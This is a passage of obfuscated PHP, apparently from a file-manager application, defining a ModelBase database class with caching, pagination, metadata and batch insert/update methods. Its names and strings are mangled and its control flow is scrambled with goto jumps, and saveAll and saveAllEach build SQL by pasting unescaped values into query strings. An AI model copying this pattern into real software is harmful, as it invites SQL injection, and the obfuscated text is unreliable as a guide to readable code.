Çó¡„¬[$D£ä…’¹ÚÂ[445]]; $e¾¥–ù÷Äğ[$D£ä…’¹ÚÂ[567]] = !0; } unset($e¾¥–ù÷Äğ); } $CŒáš›¢ƒğ = array(); foreach ($F¶Î–¡ƒ„í as $F’Å–³¡) { if (isset($F’Å–³¡[$D£ä…’¹ÚÂ[567]]) && $F’Å–³¡[$D£ä…’¹ÚÂ[567]]) { continue; } $Dƒ‚¥Ï…‡Ú = $e½³ÃÌÅ¯->getPathInner($F’Å–³¡[$D£ä…’¹ÚÂ[76]]); $D†ØÑ«ÒÙİ = $E²ÅÓŒ¸¯è->addFileMake($Dƒ‚¥Ï…‡Ú, $F’Å–³¡[$D£ä…’¹ÚÂ[78]], $F’Å–³¡[$D£ä…’¹ÚÂ[171]], $F’Å–³¡[$D£ä…’¹ÚÂ[170]], $F’Å–³¡[$D£ä…’¹ÚÂ[28]], $DÏÀÎ¶ÛÃ); $CŒáš›¢ƒğ[] = $D†ØÑ«ÒÙİ; } goto CßÑ´”µâç; DÉƒä—×İ“: $Dí¨±’ó–„ = $Dí¨±’ó–„ ? $Dí¨±’ó–„ : array(); foreach ($Dí¨±’ó–„ as $eİ Çó¡„¬) { if (!isset($CìÍŒáÊò„[$eİ Çó¡„¬[$D£ä…’¹ÚÂ[170]]])) { continue; } $fšÏÆ¡î½ =& $CìÍŒáÊò„[$eİ Çó¡„¬[$D£ä…’¹ÚÂ[170]]]; foreach ($fšÏÆ¡î½ as &$e¾¥–ù÷Äğ) { $e¾¥–ù÷Äğ[$D£ä…’¹ÚÂ[445]] = $eİ Çó¡„¬[$D£ä…’¹ÚÂ[445]]; } unset($e¾¥–ù÷Äğ); } $b½è½±¾Ü = array(); goto eÙßµæÆ‹; CßÑ´”µâç: $E²ÅÓŒ¸¯è->addAll($CŒáš›¢ƒğ); $a×áºÀ¯éµ = array($D£ä…’¹ÚÂ[170] => array($D£ä…’¹ÚÂ[7], array_keys($CìÍŒáÊò„))); $Dí¨±’ó–„ = $E²ÅÓŒ¸¯è->where($a×áºÀ¯éµ)->select(); goto DÉƒä—×İ“; E¸Ü¦—‘ìå: } } define($_SERVER[´¬][571], $_SERVER[´¬][572]); goto bÓ–ğÄŠ¡; e¡ÍŞß¢Ï: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\x64\151\146\171\x54\x69\155\x65", "\164\151\155\145", "\x69\x6e\x73\x65\162\x74\x2c\x75\160\144\x61\x74\145", "\146\165\156\143\x74\x69\157\x6e"), array("\x63\x72\145\141\164\x65\x54\151\155\x65", "\164\151\x6d\145", "\151\x6e\163\145\162\164", "\146\165\156\143\164\151\157\x6e")); public function setDataAuto($d¹†¸Ø¶Ê³) { $this->dataAuto = $d¹†¸Ø¶Ê³; } public function __construct($CßÄóèÕŠ = '', $DÑÎ°°ÊĞ = '', $EêÕĞÄ®æÃ = '') { parent::__construct($CßÄóèÕŠ, $DÑÎ°°ÊĞ, $EêÕĞÄ®æÃ); } public static function textEncode($e ÚæŠèÊ°) { if (!$e ÚæŠèÊ°) { return $e ÚæŠèÊ°; } $fò­Ë™¦îŸ = json_encode($e ÚæŠèÊ°); $fò­Ë™¦îŸ = preg_replace_callback($_SERVER[´¬][352], function ($a˜²ÅË°®) { return addslashes($a˜²ÅË°®[0]); }, $fò­Ë™¦îŸ); return json_decode($fò­Ë™¦îŸ); } public static function textDecode($c‰ªÌœëêê) { $bÉ¬¬‘Š¯« =& $_SERVER[´¬]; $b‚ãßÆôÁ = json_encode($c‰ªÌœëêê); $b‚ãßÆôÁ = preg_replace_callback($bÉ¬¬‘Š¯«[353], function ($cíì‡ËáñÏ) { return $_SERVER[´¬][97]; }, $b‚ãßÆôÁ); return json_decode($b‚ãßÆôÁ); } protected $tableMeta = array(); protected function _beforeInsert(&$e—Ø„Ş‚‡², $d‰ğÈÂÚ†‚) { $Aòèß‚ç‡ =& $_SERVER[´¬]; if (!$this->checkDataAutoHas($Aòèß‚ç‡[354])) { return; } $this->dataBeforeFilter($e—Ø„Ş‚‡², $Aòèß‚ç‡[354]); } protected function _beforeUpdate(&$f¢Ş¥Š¿¡, $c¼²éµÁ÷Ù) { $cˆÁÊ‚…¥ =& $_SERVER[´¬]; if (!$this->checkDataAutoHas($cˆÁÊ‚…¥[355])) { return; } $this->dataBeforeFilter($f¢Ş¥Š¿¡, $cˆÁÊ‚…¥[355]); } protected function _afterSelect(&$F¸æí…œ¹ì, $c¡ƒ‰Ğˆ) { if (!is_array($F¸æí…œ¹ì)) { return; } if (!$this->checkDataAutoHas($_SERVER[´¬][356])) { return; } foreach ($F¸æí…œ¹ì as &$Cùƒ°¸Š‰) { $this->dataAfterFilter($Cùƒ°¸Š‰); } unset($Cùƒ°¸Š‰); } protected function _afterFind(&$dâö„ö»œÁ, $BæÅŠÇ—Æ) { if (!is_array($dâö„ö»œÁ)) { return; } if (!$this->checkDataAutoHas($_SERVER[´¬][356])) { return; } $this->dataAfterFilter($dâö„ö»œÁ); } public function setAutoIncrement($D±÷‹ÍŒ¿¿) { $cºáœè²é = array($this->getPk() => $D±÷‹ÍŒ¿¿); $F²‡Êìµ„õ = $this->data($cºáœè²é)->add(); if ($F²‡Êìµ„õ) { $this->delete($F²‡Êìµ„õ); } } public function getAutoIncrement() { $f¡Æùò¦óè = $this->getTableName(); $CÛ±–¼­™ = $this->max($this->getPk()); $A£’‚„š³˜ = $this->query("\x73\150\157\167\x20\164\x61\x62\154\145\40\x73\164\141\x74\x75\163\40\x77\x68\x65\162\x65\40\116\141\155\x65\x3d\x27{$f¡Æùò¦óè}\x27"); $BñĞİçß« = $A£’‚„š³˜[0][$_SERVER[´¬][357]]; $AÀ§İè’¿ƒ = max($CÛ±–¼­™, $BñĞİçß«); return $AÀ§İè’¿ƒ; } protected function _callBefore($e²ë–è­Ğê, $eê¢ï…Ø©) { return $this->cacheCallCheck($e²ë–è­Ğê, $eê¢ï…Ø©, !1); } protected function _callAfter($CËÁè¼®, $a¨°ùŒ¼íó) { return $this->cacheCallCheck($CËÁè¼®, $a¨°ùŒ¼íó, !0); } protected function cacheFunctionAlias($C˜‡Æˆ±ø£) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($D´ñ²ºìâ, $FÕ’Š‘”, $Fò‹èšÁ±« = false) { $Aº“ÂÕŠ«Á = $this->cacheFunctionAlias($FÕ’Š‘”); if (!$Aº“ÂÕŠ«Á) { return; } foreach ($Aº“ÂÕŠ«Á as $Có®È¯èÕ• => $Dã™ÀÃ†Å±) { $EññìÂİÛ = $Dã™ÀÃ†Å±[0]; $EÚÂ“èŞÌÓ = explode($_SERVER[´¬][47], $Dã™ÀÃ†Å±[1]); if ($D´ñ²ºìâ == $Có®È¯èÕ•) { return $this->cacheFunctionGet($Có®È¯èÕ•, $EññìÂİÛ); } if ($Fò‹èšÁ±« && in_array($D´ñ²ºìâ, $EÚÂ“èŞÌÓ)) { $this->cacheFunctionClear($Có®È¯èÕ•, $EññìÂİÛ); } } } public function cacheFunctionGet($EÛœ©†ñõ, $bƒ°ï«ŠÅ¨) { $AÅÌ°ºØ®˜ = $this->cacheKeyMake($EÛœ©†ñõ, $bƒ°ï«ŠÅ¨); $d™£–•¸œ = Cache::get($AÅÌ°ºØ®˜); if (!is_array($d™£–•¸œ)) { $d™£–•¸œ = call_user_func_array(array($this, $EÛœ©†ñõ), array($bƒ°ï«ŠÅ¨, !0)); Cache::set($AÅÌ°ºØ®˜, $d™£–•¸œ); } return $d™£–•¸œ; } public function cacheFunctionClear($bßØ…ó»•Ø, $BùîæˆÕù) { $aÂøÄÇİŒ± = $BùîæˆÕù; if (!is_array($BùîæˆÕù)) { $aÂøÄÇİŒ± = array($BùîæˆÕù); } foreach ($aÂøÄÇİŒ± as $EŠ×÷Š¤™œ) { $Cßâª˜±¶• = $this->cacheKeyMake($bßØ…ó»•Ø, $EŠ×÷Š¤™œ); Cache::remove($Cßâª˜±¶•); } } private function cacheKeyMake($dğ‰àˆ¯Æİ, $cÃ„Í¸òè) { $Añá«×­Ô¤ =& $_SERVER[´¬]; return get_class($this) . $Añá«×­Ô¤[71] . $dğ‰àˆ¯Æİ . $Añá«×­Ô¤[358] . $cÃ„Í¸òè; } protected function selectPageReset() { $cô»™…Ö =& $_SERVER[´¬]; if (isset($GLOBALS[$cô»™…Ö[359]])) { return; } $GLOBALS[$cô»™…Ö[359]] = isset($GLOBALS[$cô»™…Ö[7]][$cô»™…Ö[360]]) ? $GLOBALS[$cô»™…Ö[7]][$cô»™…Ö[360]] : !1; $GLOBALS[$cô»™…Ö[361]] = isset($GLOBALS[$cô»™…Ö[7]][$cô»™…Ö[350]]) ? $GLOBALS[$cô»™…Ö[7]][$cô»™…Ö[350]] : !1; $GLOBALS[$cô»™…Ö[7]][$cô»™…Ö[360]] = !1; $GLOBALS[$cô»™…Ö[7]][$cô»™…Ö[350]] = !1; } protected function selectPageRestore() { $e®‡«ùÁîÖ =& $_SERVER[´¬]; if (!isset($GLOBALS[$e®‡«ùÁîÖ[359]])) { return; } $GLOBALS[$e®‡«ùÁîÖ[7]][$e®‡«ùÁîÖ[360]] = $GLOBALS[$e®‡«ùÁîÖ[359]]; $GLOBALS[$e®‡«ùÁîÖ[7]][$e®‡«ùÁîÖ[350]] = $GLOBALS[$e®‡«ùÁîÖ[361]]; unset($GLOBALS[$e®‡«ùÁîÖ[359]]); unset($GLOBALS[$e®‡«ùÁîÖ[361]]); } protected function selectPage($B¾£™† Â³ = 200, $aßĞĞÖåŒ = 1) { goto A×ä†õê¬; E¼à‚¹«Ä: $b¤ÕîÊß«Œ = array(); $Bè“¶Î™—ø = 1; if ($aßĞĞÖåŒ == 1 && $Bè“¶Î™—ø) { $this->optionsValue($c©ÖŸ´ï­ç); $b¤ÕîÊß«Œ = $this->page($aßĞĞÖåŒ, $B¾£™† Â³)->select(); $Bä»“†ğªÉ = is_array($b¤ÕîÊß«Œ) ? count($b¤ÕîÊß«Œ) : 0; if ($Bä»“†ğªÉ < $B¾£™† Â³) { $díØ‡ÛÒ™ö = 1; } else { $this->optionsValue($E¸ÅÚ‡¡Éò); $Bä»“†ğªÉ = intval($this->count()); $díØ‡ÛÒ™ö = ceil($Bä»“†ğªÉ / $B¾£™† Â³); } } else { $this->optionsValue($E¸ÅÚ‡¡Éò); $Bä»“†ğªÉ = intval($this->count()); $díØ‡ÛÒ™ö = ceil($Bä»“†ğªÉ / $B¾£™† Â³); $aßĞĞÖåŒ = $aßĞĞÖåŒ >= $díØ‡ÛÒ™ö ? $díØ‡ÛÒ™ö : $aßĞĞÖåŒ; $this->optionsValue($c©ÖŸ´ï­ç); $b¤ÕîÊß«Œ = $this->page($aßĞĞÖåŒ, $B¾£™† Â³)->select(); } goto c•¯öèÒÈŸ; b£¤â¥‘˜: return $AÌÁÁ÷ ¥; goto CµŞÕïÂá; cøÄŠï‹: $B¾£™† Â³ = $B¾£™† Â³ <= 5 ? 5 : ($B¾£™† Â³ >= $Aù¹›‡Åá¨ ? $Aù¹›‡Åá¨ : $B¾£™† Â³); $aßĞĞÖåŒ = intval(isset($in[$eğ’­âë[350]]) && $in[$eğ’­âë[350]] ? $in[$eğ’­âë[350]] : $aßĞĞÖåŒ); $aßĞĞÖåŒ = $aßĞĞÖåŒ <= 1 ? 1 : $aßĞĞÖåŒ; goto E¼à‚¹«Ä; AŞ÷Úöè: $E¸ÅÚ‡¡Éò = $c©ÖŸ´ï­ç; $E¸ÅÚ‡¡Éò[$eğ’­âë[362]] = array(); $B¾£™† Â³ = intval($B¾£™† Â³); goto cøÄŠï‹; c•¯öèÒÈŸ: if (!is_array($b¤ÕîÊß«Œ)) { $b¤ÕîÊß«Œ = array(); } if ($díØ‡ÛÒ™ö == 1) { $Bä»“†ğªÉ = count($b¤ÕîÊß«Œ); } $AÌÁÁ÷ ¥ = array($eğ’­âë[363] => array($eğ’­âë[364] => $Bä»“†ğªÉ, $eğ’­âë[360] => $B¾£™† Â³, $eğ’­âë[350] => $aßĞĞÖåŒ, $eğ’­âë[365] => $díØ‡ÛÒ™ö), $eğ’­âë[366] => $b¤ÕîÊß«Œ); goto b£¤â¥‘˜; AÆÃğÛóë†: $Aù¹›‡Åá¨ = 50000; $B¾£™† Â³ = isset($in[$eğ’­âë[360]]) && $in[$eğ’­âë[360]] ? $in[$eğ’­âë[360]] : $B¾£™† Â³; if ($B¾£™† Â³ === -1) { $in[$eğ’­âë[360]] = !1; $Aù¹›‡Åá¨ = 100000000; $B¾£™† Â³ = $Aù¹›‡Åá¨; } goto AŞ÷Úöè; A×ä†õê¬: $eğ’­âë =& $_SERVER[´¬]; global $in; $c©ÖŸ´ï­ç = $this->optionsValue(); goto AÆÃğÛóë†; CµŞÕïÂá: } protected function checkLength($FŠÒ×‡ã”‘, $FÆ°ˆŒ‡ĞŞ = 0, $dæÛôíç = '') { $b¸«½‚Š¸ô =& $_SERVER[´¬]; $FÆ°ˆŒ‡ĞŞ = $FÆ°ˆŒ‡ĞŞ ? $FÆ°ˆŒ‡ĞŞ : 65536; if (!$FŠÒ×‡ã”‘ || strlen($FŠÒ×‡ã”‘) < $FÆ°ˆŒ‡ĞŞ) { return; } $dæÛôíç = $dæÛôíç ? $dæÛôíç . $b¸«½‚Š¸ô[68] : $b¸«½‚Š¸ô[33]; show_json($dæÛôíç . LNG($b¸«½‚Š¸ô[367]) . "\x28{$FÆ°ˆŒ‡ĞŞ}\x29", !1); } protected function metaSet($EÎ’òæÎÆØ, $Fë¤¿×ÁãÖ = null, $eº­äˆÆìÊ = null) { goto Dö·ò‰‚ñš; EñŸï¬ßÑ: CacheLock::unlock($EÁì÷‡ÊØ); return !0; goto EñĞ©¿ƒù©; eê†ª¸°œé: $e¥±ï‡âõÚ = $this->tableMeta[$C‚ù†ò««[369]]; $EØôñ§¾‡Ì = Model($e¥±ï‡âõÚ); $e–˜»Ò’‚ = array($aÏˆ¢„ì => $EÎ’òæÎÆØ, $C‚ù†ò««[370] => $Fë¤¿×ÁãÖ); goto DÏ×†Ÿâ¢; Dö·ò‰‚ñš: $C‚ù†ò«« =& $_SERVER[´¬]; if (!$this->tableMeta || !$EÎ’òæÎÆØ) { return !1; } $aÏˆ¢„ì = $this->tableMeta[$C‚ù†ò««[368]]; goto eê†ª¸°œé; b¹µË¯Ç¼ì: if (is_string($Fë¤¿×ÁãÖ)) { $E–¯ëöã[$Fë¤¿×ÁãÖ] = $eº­äˆÆìÊ; } $eîòòØáâ = array(); foreach ($E–¯ëöã as $c“¦¼Š¼ƒæ => $cï×¶÷Š¯Š) { $this->checkLength($cï×¶÷Š¯Š, !1, $e¥±ï‡âõÚ . $C‚ù†ò««[4] . $c“¦¼Š¼ƒæ); $eîòòØáâ[] = array($aÏˆ¢„ì => $EÎ’òæÎÆØ, $C‚ù†ò««[93] => $c“¦¼Š¼ƒæ, $C‚ù†ò««[371] => $cï×¶÷Š¯Š); } goto cñ‡îæÙ•Ë; cñ‡îæÙ•Ë: $EÁì÷‡ÊØ = $C‚ù†ò««[372] . $this->tableMeta; CacheLock::lock($EÁì÷‡ÊØ); $EØôñ§¾‡Ì->where(array($aÏˆ¢„ì => $EÎ’òæÎÆØ))->addAll($eîòòØáâ, array(), !0); goto EñŸï¬ßÑ; DÏ×†Ÿâ¢: if (is_null($Fë¤¿×ÁãÖ)) { return $EØôñ§¾‡Ì->where(array($aÏˆ¢„ì => $EÎ’òæÎÆØ))->delete(); } if (is_null($eº­äˆÆìÊ) && is_string($Fë¤¿×ÁãÖ)) { return $EØôñ§¾‡Ì->where($e–˜»Ò’‚)->delete(); } $E–¯ëöã = is_array($Fë¤¿×ÁãÖ) ? $Fë¤¿×ÁãÖ : array(); goto b¹µË¯Ç¼ì; EñĞ©¿ƒù©: } public function metaGet($a½Ä†±šù, $F”·‰Ü¤Â = false) { goto eÃæ¬Œ¶¦; dÛ¹ß¹ñ®: $Fê¶»‰÷ëò = $B²Š«Ò‘Ìí->field($CêÏ¤¾å§—[373])->where($b±äÃİöÓ)->select(); $Fê¶»‰÷ëò = array_to_keyvalue($Fê¶»‰÷ëò, $CêÏ¤¾å§—[93], $CêÏ¤¾å§—[371]); return $Fê¶»‰÷ëò; goto dƒ©·ğŠ’ù; eÃæ¬Œ¶¦: $CêÏ¤¾å§— =& $_SERVER[´¬]; if (!$this->tableMeta) { return array(); } $cÓ‡×¯”ô = $this->tableMeta[$CêÏ¤¾å§—[368]]; goto c¦¶‹É„ñ‡; c¦¶‹É„ñ‡: $B²Š«Ò‘Ìí = Model($this->tableMeta[$CêÏ¤¾å§—[369]]); if ($F”·‰Ü¤Â) { $b±äÃİöÓ = array($cÓ‡×¯”ô => $a½Ä†±šù, $CêÏ¤¾å§—[93] => $F”·‰Ü¤Â); return $B²Š«Ò‘Ìí->where($b±äÃİöÓ)->getField($CêÏ¤¾å§—[371]); } $b±äÃİöÓ = array($cÓ‡×¯”ô => $a½Ä†±šù); goto dÛ¹ß¹ñ®; dƒ©·ğŠ’ù: } private function checkDataAutoHas($dÜ¡Œœ“¼ƒ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $cÚ½éàÙ³) { if (in_array($dÜ¡Œœ“¼ƒ, explode($_SERVER[´¬][47], $cÚ½éàÙ³[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$FªÃ©ˆğöí, $cÉ¾‹²¹‹­) { $f÷Ê£‰†ŠÖ =& $_SERVER[´¬]; foreach ($this->dataAuto as $cÕò›½î©) { $b˜§ÃŸÕ = $cÕò›½î©[0]; if (!in_array($cÉ¾‹²¹‹­, explode($f÷Ê£‰†ŠÖ[47], $cÕò›½î©[2]))) { continue; } switch (trim($cÕò›½î©[3])) { case $f÷Ê£‰†ŠÖ[318]: case $f÷Ê£‰†ŠÖ[319]: $B‘„‚‡¹ÙŞ = $cÕò›½î©[1]; $bŞõ«˜Û’ = isset($cÕò›½î©[4]) ? (array) $cÕò›½î©[4] : array(); if ($B‘„‚‡¹ÙŞ == $f÷Ê£‰†ŠÖ[196] && array_key_exists($b˜§ÃŸÕ, $FªÃ©ˆğöí)) { if (!$FªÃ©ˆğöí[$b˜§ÃŸÕ]) { unset($FªÃ©ˆğöí[$b˜§ÃŸÕ]); } break; } if (isset($FªÃ©ˆğöí[$b˜§ÃŸÕ])) { array_unshift($bŞõ«˜Û’, $FªÃ©ˆğöí[$b˜§ÃŸÕ]); } if ($f÷Ê£‰†ŠÖ[318] == $cÕò›½î©[3]) { $FªÃ©ˆğöí[$b˜§ÃŸÕ] = call_user_func_array($B‘„‚‡¹ÙŞ, $bŞõ«˜Û’); } else { $FªÃ©ˆğöí[$b˜§ÃŸÕ] = call_user_func_array(array(&$this, $B‘„‚‡¹ÙŞ), $bŞõ«˜Û’); } break; case $f÷Ê£‰†ŠÖ[270]: $FªÃ©ˆğöí[$b˜§ÃŸÕ] = $FªÃ©ˆğöí[$cÕò›½î©[1]]; break; case $f÷Ê£‰†ŠÖ[291]: if (isset($FªÃ©ˆğöí[$b˜§ÃŸÕ]) && !is_string($FªÃ©ˆğöí[$b˜§ÃŸÕ])) { $FªÃ©ˆğöí[$b˜§ÃŸÕ] = json_encode_force($FªÃ©ˆğöí[$b˜§ÃŸÕ]); } break; case $f÷Ê£‰†ŠÖ[320]: if ($FªÃ©ˆğöí[$b˜§ÃŸÕ] === $f÷Ê£‰†ŠÖ[33]) { unset($FªÃ©ˆğöí[$b˜§ÃŸÕ]); } break; case $f÷Ê£‰†ŠÖ[321]: $FªÃ©ˆğöí[$b˜§ÃŸÕ] = $cÕò›½î©[1]; default: break; } } if ($cÉ¾‹²¹‹­ == $f÷Ê£‰†ŠÖ[354]) { $CÎ¾©Š‡÷ = strtolower($this->db->getDbType()); if (strpos($CÎ¾©Š‡÷, $f÷Ê£‰†ŠÖ[9]) !== 0) { return; } $B£ğ¨ˆ¹Èä = $this->field(!0)->fields; $d¨ÍĞ¾›‘¸ = $B£ğ¨ˆ¹Èä[$f÷Ê£‰†ŠÖ[249]]; if (isset($B£ğ¨ˆ¹Èä[$f÷Ê£‰†ŠÖ[248]])) { unset($d¨ÍĞ¾›‘¸[$B£ğ¨ˆ¹Èä[$f÷Ê£‰†ŠÖ[248]]]); } foreach ($d¨ÍĞ¾›‘¸ as $d¼àˆ®¤” => $cÉ¾‹²¹‹­) { if (!isset($FªÃ©ˆğöí[$d¼àˆ®¤”])) { $FªÃ©ˆğöí[$d¼àˆ®¤”] = $f÷Ê£‰†ŠÖ[33]; } } } } private function dataAfterFilter(&$fĞî¬·Ä) { $f¨Ÿ‚‹¢Óİ =& $_SERVER[´¬]; foreach ($this->dataAuto as $fÌÚ‹Ñ†•ï) { $C‰¾¶ÖÔƒœ = $fÌÚ‹Ñ†•ï[0]; if (!in_array($f¨Ÿ‚‹¢Óİ[356], explode($f¨Ÿ‚‹¢Óİ[47], $fÌÚ‹Ñ†•ï[2]))) { continue; } if (!isset($fĞî¬·Ä[$C‰¾¶ÖÔƒœ])) { continue; } switch (trim($fÌÚ‹Ñ†•ï[3])) { case $f¨Ÿ‚‹¢Óİ[318]: case $f¨Ÿ‚‹¢Óİ[319]: $b…§Ã“ğ = isset($fÌÚ‹Ñ†•ï[4]) ? (array) $fÌÚ‹Ñ†•ï[4] : array(); array_unshift($b…§Ã“ğ, $fĞî¬·Ä[$C‰¾¶ÖÔƒœ]); if ($f¨Ÿ‚‹¢Óİ[318] == $fÌÚ‹Ñ†•ï[3]) { $fĞî¬·Ä[$C‰¾¶ÖÔƒœ] = call_user_func_array($fÌÚ‹Ñ†•ï[1], $b…§Ã“ğ); } else { $fĞî¬·Ä[$C‰¾¶ÖÔƒœ] = call_user_func_array(array(&$this, $fÌÚ‹Ñ†•ï[1]), $b…§Ã“ğ); } break; case $f¨Ÿ‚‹¢Óİ[270]: $fĞî¬·Ä[$C‰¾¶ÖÔƒœ] = $fĞî¬·Ä[$fÌÚ‹Ñ†•ï[1]]; break; case $f¨Ÿ‚‹¢Óİ[291]: $bÎ†ñ”é†‚ = $fĞî¬·Ä[$C‰¾¶ÖÔƒœ]; $fĞî¬·Ä[$C‰¾¶ÖÔƒœ] = json_decode($bÎ†ñ”é†‚, !0); if (is_null($fĞî¬·Ä[$C‰¾¶ÖÔƒœ])) { $fĞî¬·Ä[$C‰¾¶ÖÔƒœ] = $bÎ†ñ”é†‚; } break; case $f¨Ÿ‚‹¢Óİ[320]: if ($fĞî¬·Ä[$C‰¾¶ÖÔƒœ] === $f¨Ÿ‚‹¢Óİ[33]) { unset($fĞî¬·Ä[$C‰¾¶ÖÔƒœ]); } break; case $f¨Ÿ‚‹¢Óİ[321]: $fĞî¬·Ä[$C‰¾¶ÖÔƒœ] = $fÌÚ‹Ñ†•ï[1]; default: break; } } } public function saveAll($B‡˜‹ÀŸê²) { goto c‰ìÑŞÁŠ×; cñ£Àõ®”: $cœô‹–ò©“ = array(); $f–ä®š•® = count($B‡˜‹ÀŸê²); for ($bµæÌ¨·ô = 0; $bµæÌ¨·ô < $f–ä®š•®; $bµæÌ¨·ô++) { $Dİ°¶¾ù’ã = $B‡˜‹ÀŸê²[$bµæÌ¨·ô]; if (!is_array($Dİ°¶¾ù’ã) || count($Dİ°¶¾ù’ã) != 4) { continue; } $a·àÑÙ¤” = "\x55\x50\104\x41\x54\x45\40\x60{$AÆ®Ì‹ï‹õ}\140\40\x53\105\124\x20{$Dİ°¶¾ù’ã[2]}\40\x3d\40\x43\101\123\x45\40{$Dİ°¶¾ù’ã[0]}\40\xa"; if ($Cñ‰¶·Ñ’Â == 0) { $bØå°õ¶É = $a·àÑÙ¤”; } $cœô‹–ò©“[] = $d‰°ë½ÚëÏ[116] . $Dİ°¶¾ù’ã[1] . $d‰°ë½ÚëÏ[116]; $Cñ‰¶·Ñ’Â++; $bØå°õ¶É .= "\x20\x57\x48\105\x4e\x20\47{$Dİ°¶¾ù’ã[1]}\x27\40\124\110\105\116\x20\x27{$Dİ°¶¾ù’ã[3]}\x27\40\12"; if ($Cñ‰¶·Ñ’Â == $dÓõ—íÜ‡È || $bµæÌ¨·ô == $f–ä®š•® - 1) { goto Ešš—×ŒøÑ; Ešš—×ŒøÑ: $d·•ìéˆ¦  = implode($d‰°ë½ÚëÏ[47], $cœô‹–ò©“); $bØå°õ¶É .= "\x20\105\116\x44\x20\x20\127\x48\105\x52\105\40{$Dİ°¶¾ù’ã[0]}\x20\111\x4e\x20\50{$d·•ìéˆ¦ }\x29\40"; $this->execute($bØå°õ¶É); goto cî¶ÏàĞ; cî¶ÏàĞ: $Cñ‰¶·Ñ’Â = 0; $bØå°õ¶É = $a·àÑÙ¤”; $this->chunkEventCheck(count($cœô‹–ò©“)); goto AˆïØå™Ô; AˆïØå™Ô: $cœô‹–ò©“ = array(); goto CåØÑî¯ƒ; CåØÑî¯ƒ: } } goto Cëé·×Ü; Cëé·×Ü: $this->chunkEventSet(); goto C‰ÎÂŒğª¥; e†¶¯†¨ÉŠ: $B‡˜‹ÀŸê² = is_array($B‡˜‹ÀŸê²) ? $B‡˜‹ÀŸê² : array(); $bØå°õ¶É = $d‰°ë½ÚëÏ[374]; $Cñ‰¶·Ñ’Â = 0; goto cñ£Àõ®”; c‰ìÑŞÁŠ×: $d‰°ë½ÚëÏ =& $_SERVER[´¬]; $AÆ®Ì‹ï‹õ = $this->tablePrefix . $this->tableName; $dÓõ—íÜ‡È = self::SQL_WHERE_IN_CHUNK; goto e†¶¯†¨ÉŠ; C‰ÎÂŒğª¥: } public function saveAllEach($F‰ÖøÏ—†¦) { $EÁ‘ÛÛ„Ââ =& $_SERVER[´¬]; $c†Ô¢ÉÆ¿ = $this->tablePrefix . $this->tableName; foreach ($F‰ÖøÏ—†¦ as $BÉŞºÁ–ñÆ) { if (!is_array($BÉŞºÁ–ñÆ) || count($BÉŞºÁ–ñÆ) != 4) { continue; } $bƒéÀ‘©© = $BÉŞºÁ–ñÆ[0] . $EÁ‘ÛÛ„Ââ[375] . $BÉŞºÁ–ñÆ[1] . $EÁ‘ÛÛ„Ââ[116]; $F­ÃÕÂ¸óÒ = $BÉŞºÁ–ñÆ[2] . $EÁ‘ÛÛ„Ââ[375] . $BÉŞºÁ–ñÆ[3] . $EÁ‘ÛÛ„Ââ[116]; $F¢²Âß—Áœ = "\165\x70\x64\x61\164\x65\x20{$c†Ô¢ÉÆ¿}\x20\x73\145\x74\x20{$F­ÃÕÂ¸óÒ}\x20\167\150\x65\162\145\40{$bƒéÀ‘©©}\x3b"; $this->execute($F¢²Âß—Áœ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($F÷°âÎïŒÓ = false, $eŠ½êÆÈÌŠ = false) { $this->_chunkEvent = $F÷°âÎïŒÓ; $this->_chunkEventParam = $eŠ½êÆÈÌŠ; } private function chunkEventCheck($C¶ğÂ½ÄĞ) { if (!$this->_chunkEvent) { return; } $c•¨¬Ñ¯­ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $c•¨¬Ñ¯­[$_SERVER[´¬][376]] = $C¶ğÂ½ÄĞ; Hook::trigger($this->_chunkEvent, $c•¨¬Ñ¯­); } public function addAll($FÌòˆŞš·, $BñÊíÔ·À˜ = array(), $c±†õßÁ® = false) { goto CáÂô¥îó; b‹”±ãÎĞå: if (empty($FÌòˆŞš·)) { $this->error = think_lang($EÜÅæ¶°Ú°[268]); return !1; } $BñÊíÔ·À˜ = $this->_parseOptions($BñÊíÔ·À˜); foreach ($FÌòˆŞš· as $fíšÑ½ìÓ¦ => $aÃÀİµø§) { $FÌòˆŞš·[$fíšÑ½ìÓ¦] = $this->_facade($aÃÀİµø§); $this->_beforeInsert($FÌòˆŞš·[$fíšÑ½ìÓ¦], $BñÊíÔ·À˜); } goto C–Šñ’ãË; CáÂô¥îó: $EÜÅæ¶°Ú° =& $_SERVER[´¬]; ignore_timeout(); $dœ·ÔÌø = self::SQL_WHERE_IN_CHUNK; goto b‹”±ãÎĞå; C–Šñ’ãË: if (method_exists($this->db, $EÜÅæ¶°Ú°[269])) { for ($d±’ãè­•¨ = 0; $d±’ãè­•¨ < count($FÌòˆŞš·); $d±’ãè­•¨ += $dœ·ÔÌø) { $cÖä“ª†â  = array_slice($FÌòˆŞš·, $d±’ãè­•¨, $dœ·ÔÌø); if (!is_array($cÖä“ª†â ) || count($cÖä“ª†â ) == 0) { break; } $AÓ†à ä = $this->db->insertAll($cÖä“ª†â , $BñÊíÔ·À˜, $c±†õßÁ®); $this->chunkEventCheck(count($cÖä“ª†â )); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($FÌòˆŞš· as $fíšÑ½ìÓ¦ => $aÃÀİµø§) { $AÓ†à ä = $this->db->insert($aÃÀİµø§, $BñÊíÔ·À˜, $c±†õßÁ®); } $this->commit(); } if (!1 !== $AÓ†à ä) { $Aí±¤³”Ô„ = $this->getLastInsID(); if ($Aí±¤³”Ô„) { return $Aí±¤³”Ô„; } } return $AÓ†à ä; goto eñÙ·‹Ş; eñÙ·‹Ş: } public function save($a±”Ø§Éé¦ = '', $cÉêÈ¬ ï = array()) { goto Dã¥·‡êáŒ; E¼ª˜²×Ô¤: $cÁÕ ÃŠ³ƒ = $this->findWhereField($EÏÀ˜´÷ôÓ); if (!$cÁÕ ÃŠ³ƒ) { return parent::save($a±”Ø§Éé¦, $cÉêÈ¬ ï); } $d‚¸¡Æáƒ = 0; goto C«¼íµ”—½; C¸¦ò¦¦¬: for ($D˜½à÷Ü = 0; $D˜½à÷Ü < $D•ª¤øîá; $D˜½à÷Ü += $Fâ­Ò±åÊˆ) { $D²Äßœ’ä = array_slice($DÑĞÈ¿°í, $D˜½à÷Ü, 